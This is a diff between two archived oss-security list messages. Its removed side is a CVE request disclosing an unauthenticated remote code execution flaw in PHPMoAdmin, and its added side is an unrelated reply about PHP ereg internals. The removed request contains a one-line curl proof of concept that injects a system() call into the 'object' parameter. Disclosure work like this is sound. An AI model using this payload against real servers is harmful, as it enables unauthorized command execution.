@@ -1,41 +1,23 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/03/04/4
-Message-ID: <20150304073545.GA18617@kludge.henri.nerv.fi>
-Date: Wed, 4 Mar 2015 09:35:45 +0200
-From: Henri Salo <henri@...v.fi>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/01/24/14
+Message-ID: <54C4101F.7060400@internot.info>
+Date: Sun, 25 Jan 2015 08:35:27 +1100
+From: Joshua Rogers <oss@...ernot.info>
 To: oss-security@...ts.openwall.com
-Cc: Pichaya Morimoto <pichaya@...e.org>
-Subject: CVE request: PHPMoAdmin Unauthorized Remote Code Execution
+Subject: Re: Re: CVE Request: PHP
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
+On 25/01/15 08:11, Joshua Rogers wrote:
+> I don't know how 'sets' are done in PHP ereg, however.
+>
+And here we go:
+"ncsets" is never >0, unless 'allocset' is run.
+And as you stated, allocset makes p->g->setbits not null.
 
-Hello MITRE,
 
-Can you assign 2015 CVE identifier for unauthorized remote code execution
-vulnerability in PHPMoAdmin <http://www.phpmoadmin.com/>, thanks.
+Thanks!
+-- 
+-- Joshua Rogers <https://internot.info/>
 
-curl "http://example.com/moadmin.php"; -d "object=1;system('id');exit"
 
-Original advisory: http://seclists.org/fulldisclosure/2015/Mar/19
-
-- -- 
-Henri Salo
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1.4.12 (GNU/Linux)
-
-iQIcBAEBAgAGBQJU9rXRAAoJECet96ROqnV0RAsP/RfOy2iFTxJKdfhQMQb+EXLZ
-IoznODmRYkOeXhyEtr2Fd4I2lX5QUiMNCCN+tyfucOu9oQ7c7L8ihwSYJxtUfseU
-nNoo+i3TKsUFqRQ7JOG4BgvPAMKhnUfisRC19Tz1WIrwRZiOl+EOpuiK3ll7zksB
-XSSmGJjYCI3//gFeeNJmNpOg3StUVuIxQPKe9krItNRPsJFnpnV/maYxfr6+62el
-HsX2eiGmYRIt4RY5YjSTYV06hmEiLv0LdhpH+AwxNopT1e58BY91le3v7Y/kkPl1
-UiOHBvo1Pc2u1dIVO2UMUUyAkMIt+2BFmcnf35L1IFtg4kxZ663uIGFXdP0O1oMA
-0BAvTYJNrDBWr6sIr0p4yLyq2YAOiUWuL88+sQN47eWRWfxlkIMYrAcWNZziYaiA
-32Sm6rAGSET62jLDwUcblGHslZEGyMtDGT+P15R1m8DiQRpShISW0HTj3tzjUqri
-5lHNMaZPRSwAxzmQrlAn7/GOM4TjPMSrzYmxGg01piuXvTxqA9tHzItS2cCkBLjq
-q5bD/qZ1JrZ6C8QHOHwkGwe2FVK0g3CeqWKhqV4e4JlfMoeQ8CbPcfjamJceHrUp
-/ihGZURp4ShdygRUJfSulfTD+YGftqgWfyR5Cp06Iae1hCqkrvvHaXPN1UDNAPaD
-gTB3J0Hu3Tub3LkiLvSb
-=lxia
------END PGP SIGNATURE-----
+Download attachment "signature.asc" of type "application/pgp-signature" (820 bytes)
